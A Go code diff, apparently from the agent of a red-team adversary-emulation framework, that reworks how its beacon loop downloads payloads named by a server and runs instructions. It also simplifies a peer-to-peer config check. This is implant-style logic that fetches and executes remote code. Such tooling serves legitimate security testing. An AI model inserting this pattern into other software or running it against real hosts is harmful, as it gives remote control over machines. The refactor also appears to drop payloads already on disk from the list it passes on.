@@ -32,11 +32,23 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
 			cmds := reflect.ValueOf(beacon["instructions"])
 			for i := 0; i < cmds.Len(); i++ {
+			    var droppedPayloads []string
 				cmd := cmds.Index(i).Elem().String()
 				command := util.Unpack([]byte(cmd))
 				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
-				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string), profile["paw"].(string), profile["platform"].(string))
-				go coms.RunInstruction(command, profile, payloads)
+
+				// Download payloads.
+				payloads := strings.Split(strings.Replace(command["payload"].(string), " ", "", -1), ",")
+                for _, payload := range payloads {
+                    if len(payload) > 0 {
+                        location := filepath.Join(payload)
+	                    if util.Exists(location) == false {
+	                        location, _ := coms.GetPayloadBytes(payload, profile["server"].(string), profile["paw"].(string),profile["platform"].(string), true)
+	                        droppedPayloads = append(droppedPayloads, location)
+	                    }
+                    }
+                }
+				go coms.RunInstruction(command, profile, droppedPayloads)
 				util.Sleep(command["sleep"].(float64))
 			}
 		} else {
@@ -101,14 +113,8 @@ func chooseP2pReceiverChannel(p2pReceiverConfig map[string]string) proxy.P2pRece
 }
 
 func validP2pReceiverConfiguration(receiver proxy.P2pReceiver, p2pReceiverConfig map[string]string) bool {
-    if receiverLoc, valid := p2pReceiverConfig["p2pReceiver"]; valid {
-        if len(receiverLoc) > 0 {
-            return true
-        } else {
-            return false
-        }
-    }
-    return false
+    receiverLoc, valid := p2pReceiverConfig["p2pReceiver"];
+    return valid && len(receiverLoc) > 0;
 }
 
 //Core is the main function as wrapped by sandcat.go
